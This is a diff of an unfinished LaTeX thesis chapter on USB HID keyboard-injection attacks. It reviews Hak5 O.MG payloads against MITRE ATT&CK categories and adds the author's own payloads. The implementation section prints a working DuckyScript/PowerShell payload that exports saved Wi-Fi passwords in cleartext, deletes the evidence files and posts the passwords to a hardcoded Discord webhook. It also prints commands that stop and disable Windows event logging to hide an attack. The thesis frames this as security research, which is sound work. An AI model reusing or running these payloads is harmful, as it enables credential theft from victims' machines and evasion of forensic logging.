@@ -2,11 +2,11 @@
 
 \section{Introduction}
 
-This chapter will describe the point of view of an attacker during a HID injection attack. To this end it will firstly explain the evaluate existing attack payloads, describe a general architecture for an attack and lastly, it will introduce new attacks. 
+This chapter will describe the point of view of an attacker during a HID injection attack. To this end it will firstly evaluate existing attack payloads, describe a general architecture for an attack  it will introduce new attacks and their architecture are well as novel defense methods against those attacks. 
 
 
 \section{Ethical Considerations}
-Attacks as described in this thesis can produce considerable harm to individuals, companies, and communities. For all the reasons explained and examples brought up in section \ref{TheDangersOfUSB} these attacks are not to be taken lightly and the potential for damage is real. For this exact reason it is important to raise awareness for this kind of attack, research existing vulnerabilities, new developments in the field, and how those can be counter acted. Investigating attacks in particular ones that are not available in a public GitHub repo is an important contribution to the scientific field and outweighs the negative. Just because these payloads cannot easily be found, does not mean they do not already exist. Which arguably makes them even more dangerous to the public and therefore their exploration is even more urgent. \\
+Attacks as described in this thesis can cause considerable harm to individuals, companies, and communities. For all the reasons explained and examples brought up in section \ref{TheDangersOfUSB} these attacks are not to be taken lightly and the potential for damage is real. For this exact reason it is important to raise awareness for this kind of attack, research existing vulnerabilities, new developments in the field, and how those can be counteracted. Investigating attacks in particular ones that are not available in a public GitHub repository is an important contribution to the scientific field and outweighs the negative. Just because these payloads cannot easily be found, does not mean they do not already exist. Which arguably makes them even more dangerous to the public and therefore their exploration is even more urgent. \\
 In section \ref{HistoryOfDefense} this thesis explains countermeasures that can be put in place to protect oneself and in section [TODO!!] new methods will be presented, specifically against new attacks introduced in section \ref{Implementation}.
 % bring up the balck/white /grey hat discussion again? or is his not scientific enough?
 
@@ -20,13 +20,13 @@ It features 14 attack categories that themselves are subdivided into 8-43 techni
 
 \subsection{Evaluation of Existing Attack Scripts}
 
-In the following, this paper will dive into some of those categories and techniques and evaluate whether that can be executed via keyboard injection and whether or not a script for it is available online. To this end, scripts form the official open source GitHub page for O.MG \footnote{https://github.com/hak5/omg-payloads} by Hak5 are examined. \\
-It is important to note that the most basic attack that can be executed via Keyboard Injection is also the most versatile and one of the most dangerous ones. It is a simple script that downloads any malware of your choice, which as a result, could execute any attack that can be done via code.  
-This analysis will therefore focus on whether an attack has been implemented solely as keyboard injection and will not feature payloads that include downloading additional malware. It will not examine all 14 categories instead highlighting the most relevant ones. 
+In the following, this thesis will dive into some of those categories and techniques and evaluate whether that can be executed via keyboard injection and whether or not a script for it is available online. To this end, scripts from the official open source GitHub page for O.MG \footnote{https://github.com/hak5/omg-payloads} by Hak5 are examined. \\
+It is important to note that the most basic attack that can be executed via Keyboard Injection is also the most versatile and one of the most dangerous ones. It is a simple script that downloads any malware of your choice, which as a result, could execute any software based attack.  
+This analysis will therefore focus on whether an attack has been implemented solely as keyboard injection and will not feature payloads that include downloading additional malware. It will not examine all 14 categories and instead highlight the most relevant ones. 
 
 \subsubsection{Reconnaissance}
 
-Reconnaissance is about actively or passively gathering information, often used before an attack. The gathered information can be used to inform the planning of a bigger attack or to further additional reconnaissance efforts. This category includes scanning of network traffic, gathering host information such as name, IP, operating system, hardware information, credentials, email, or information about their network. Phishing also belongs into this category, and purchasing information about the system from legal or illegal data brokers as well as gathering publicly available information, for example from the internet. \cite{MITREATTCK}
+Reconnaissance is about actively or passively gathering information, often used before an attack. The gathered information can be used to inform the planning of a bigger attack or to further additional reconnaissance efforts. This category includes scanning of network traffic, gathering host information such as name, IP, operating system, hardware information, credentials, email, or information about their network. Phishing also belongs into this category, and purchasing information about the system from legal or illegal data brokers as well as gathering publicly available information, for example from the internet \cite{MITREATTCK}.
 
 This is a field in which keyboard injection can make considerable damage. There exist many exfiltration scripts, that download sensitive files, exfiltrate passwords, network information, and device information, or social engineer the user to enter sensitive data on malicious sites. 
 
@@ -40,13 +40,13 @@ The recon folder contains a script that does device recon using a Powershell scr
 
 \subsubsection{Resource Development}
 
-Resource Development is what a malicious actor does when they want to establish resources that can help them mount an attack, such as getting access to specific email addresses, system accounts, or target system. It also includes setting up servers or bots that could be used for an attack or creating and cultivating accounts to build a persona.\cite{MITREATTCK}\\
+Resource Development is what a malicious actor does when they want to establish resources that can help them mount an attack, such as getting access to specific email addresses, system accounts, or target system. It also includes setting up servers or bots that could be used for an attack or creating and cultivating accounts to build a persona \cite{MITREATTCK}.\\
 Resource Development is an important part of injection attacks in conjunction with data exfiltration. This is apparent in payloads like \verb|ExfiltrateLinuxLogFiles| \cite{OmgpayloadsPayloadsLibrary}, \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}, \verb|-OMG-Credz-Plz| \cite{OmgpayloadsPayloadsLibrary}, or \verb|OMG-AwarenessTraining| \cite{OmgpayloadsPayloadsLibrary} which send the exfiltrated data to a webhook, discord webhook, or Dropbox. Any kind of passing on of data from the O.MG cable to the attacker will require some resource for communication. 
 
 
 \subsubsection{Initial Access}
 
-Initial Access is about an adversary trying to get access to a target network\cite{MITREATTCK}. One example for how this can be done with keyboard injection are \verb|revshell_windows| and \verb|win_winrm-backdoor| \cite{OmgpayloadsPayloadsLibrary}; payloads that establish remote control over a targeted computer. Through that access point, the network can be infiltrated. Similarly, passwords for networks can be exfiltrated from a target computer \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}.\\
+Initial Access is about an adversary trying to get access to a target network\cite{MITREATTCK}. One example for how this can be done with keyboard injection are \verb|revshell_windows| and \verb|win_winrm-backdoor| \cite{OmgpayloadsPayloadsLibrary}; payloads that establish remote control over a targeted computer. Through that access point, the network can be infiltrated. Similarly, passwords for networks can be exfiltrated from a target computer using \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}.\\
 
 \subsubsection{Execution}
 
@@ -80,7 +80,7 @@ Exfiltration is about how the stolen data can be relayed to the attacker \cite{M
 
 \subsubsection{Impact}
 
-The techniques belonging to impact are not widely represented in the GitHub repository. They include scripts that try to manipulate, interrupt or destroy systems and data. However, it has been shown by \cite{lawalFacilitatingCyberenabledFraud2022} that it is possible to change, meaning manipulate, data on a target's computer without leaving traces of an attack, thereby framing the computer's user(s) for the data change. \cite{MITREATTCK}
+The techniques belonging to impact are not widely represented in the GitHub repository. They include scripts that try to manipulate, interrupt or destroy systems and data \cite{MITREATTCK}. However, it has been shown by \cite{lawalFacilitatingCyberenabledFraud2022} that it is possible to change, meaning manipulate, data on a target's computer without leaving traces of an attack, thereby framing the computer's user(s) for the data change. 
 
 
 \subsubsection{Intermediate Conclusion}
@@ -105,5 +105,141 @@ When preparing for an HID injection attack, a malicious actor has to pay attenti
 The foremost component to an attack is the target. It determines all other factors. Crucial is the goal of the attack, the level of available access, and the environment and characteristics of the target.\\
 The goal determines the type of attack, which will be further specified by the environment, chaarcteristics and access. [where am i going with this, in how far is it even relevant?] 
 
+
+\section{Methodology} \label{methodology}
+
+\subsection{Intro}
+
+This section will give an overview over the methodologies of the developed payloads and defenses.
+
+
+\subsection{Payloads}
+
+Payloads can follow either or a combination of two main strategies; 
+\begin{enumerate}
+    \item User Interface (UI) based
+    \item Command Line Interface (CLI) based
+\end{enumerate}
+
+UI based payloads follow the line of action a typical UI focused User would take. For example, for sending an email, such a user might search for the email application icon on their desktop, click on it, then click on 'new Mail' and fill out all the fields of the mail form, then click on send. A payload that mimics this behaviour, would navigate in the same way, just using the keyboard instead of the mouse. For instance, if the outlook icon was the fourth icon on the taskbar, it could be selected with Windows key + 3. The 'new Mail' button would be reached with 16 tabs or by using  Ctrl + N. The entire payload would be constructed in such a manner, navigating the expected UI. \\
+The issues that might arise here become clear fast; how would you know, where on the taskbar outlook is located? What if the computer is not connected to the internet and instead of opening outlook an error message pops up? What if the computer is very slow and the Ctrl + N is sent before the email application has fully loaded?  Some of these issues can be accounted for, outlook for instance can also be opened by searching for it in the start menu, however determining whether the application has loaded is impossible with the O.MG cable. The risk can be mitigated by impelementing long delays between commands, however, this also creates a lit of time overhead which can be a big drawback in time sensitive situations. \\
+
+Fewer detail problems of this sort are caused by the CLI approach. It allows for a generally more clean and concise execution of an attack. It simplifies many actions and is often more direct and therefore faster. Take the mail example again. Powershell has a cmdlet that allows you to send email directly. This cuts down nearly all navigation and the risks and time overhead that come with it. \\
+Drawbacks of this method might be that it can be more easily detected since it is such unexpected user behaviour. An average use would not use the command line to send an email, if they ever even use a command line. Therefore actions like opening the Windows run window and starting powershell.exe can easily be flagged as suspicious behaviour. Another obstacle might be user priviledges. Some commands require admin access, which is easy to deal with if the target is the admin user on the computer (simply deal with the popup) but requires the admin user's password if the target is not admin themselves. 
+
+
+Payloads can either have some kind of impact on the system, be used to exfiltrate some data or both.
+
+In the following, developed payloads will be presented.
+
+\subsubsection{Disable Windows Event Logging}
+
+Windows event logging is a built in windows functionality that does logs the system's activity. There are multiple event types; Error, Warning, Information, Success Audit, Failure Audit logged in multiple different categories; System Log, Application Log, Security, Setup and Forwarded Events. 
+Some actions on a system might raise errors, warnings or other types of events in one of the logs, indicating that an attack has taken or is taking place. In order to avoid being found out during or after the attack, a hacker might therefore attempt to disable the logging to leave as few traces as possible. For this reason, this kind of attack is classified under the ATT\&CK Defense Evasion category. \\
+There are multiple ways to disable windows event logging, in the implementation chapter, an UI option and a CLI option will be presented. 
+
+
+\subsubsection{Exfiltrate WLAn passwords via Discord}
+
+[maybe make exfiltration it's own subchapter as one of the building blocks of the paylaods?]
+
+
+
 \section{Implementation} \label{Implementation}
 
+\subsection{Payloads}
+
+\subsubsection{Disable Windows Event Logging}
+
+This thesis presents two approaches to windows event logging.
+
+\textbf{UI} 
+
+This implementation opens the Windows Event log application through the Windows Run window and navigates to the correct pane where it disables the logging.
+This approach mimics the action of a UI focused user. As explained in section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
+The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:
+
+DELAY 1000
+TAB
+DELAY 2000
+STRING m
+DELAY 2000
+TAB
+DELAY 2000
+ENTER
+DELAY 6000
+TAB
+DELAY 2000
+TAB
+DELAY 2000
+TAB
+DELAY 2000
+TAB
+DELAY 2000
+
+
+\textbf{CLI}
+
+Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin level commands might pose a problem, as discussed in section \ref{methodology} \\
+
+Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
+The CLI appraoch is more reliable and concise, however, it requires admin priviledges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
+
+STRINGLN Stop-Service -Name "eventlog"
+DELAY 200
+STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
+DELAY 300
+STRINGLN exit
+
+
+\subsection{1. Stealing WLAN Passwords}
+
+This is a basic implementation for a password stealing attack that exfiltrates the names and passwords of stored WLAN passwords on a windows 11 machine via Powershell. The exfiltration happens over a discord webhook \\
+First, powershell is started and the path changed to the temp file. Then netstat is used to extract the available WLAN information. For each of the with netstat created files, the name and password are extracted and converted to a json that can then be sent to the provided discord webhook. The file that was created is deleted right after the information needed from it has been extracted. After all is done, the powershell windwow is closed again.
+
+\begin{verbatim}
+
+DUCKY_LANG DE_CH
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING cd $Env:temp
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1000
+STRING $Webhook = "https://discord.com/api/webhooks/1239948314686914591/KrGR_s1qlJbypG9F8jYVq8gDpAyBKFmEcyevqVlmTZOGcvs__5OXVx4QhRpyYLaaeJfG"
+ENTER
+DELAY 300
+STRING $files = Get-ChildItem WiFi-*.xml
+ENTER
+DELAY 300
+STRING foreach ($file in $files) {
+ENTER
+STRING $xmlContent = Get-Content -Path $file
+ENTER
+STRING Remove-Item $file
+ENTER
+STRING $xmlObject = [xml]$xmlContent
+ENTER
+STRING $Payload = @{name = $xmlObject.WLANProfile.SSIDConfig.SSID.name}
+ENTER
+STRING $Payload += @{password = $xmlObject.WLANProfile.MSM.security.sharedKey.keyMaterial}
+ENTER
+STRING $Json = @{content = $Payload | ConvertTo-Json } | ConvertTo-Json	
+ENTER
+STRING Invoke-RestMethod -Uri $Webhook -Method Post -Body $Json -ContentType 'application/json'
+ENTER
+STRING }
+ENTER
+DELAY 10000
+ALT SPACE
+DELAY 100
+STRING C
+    
+\end{verbatim}
+    
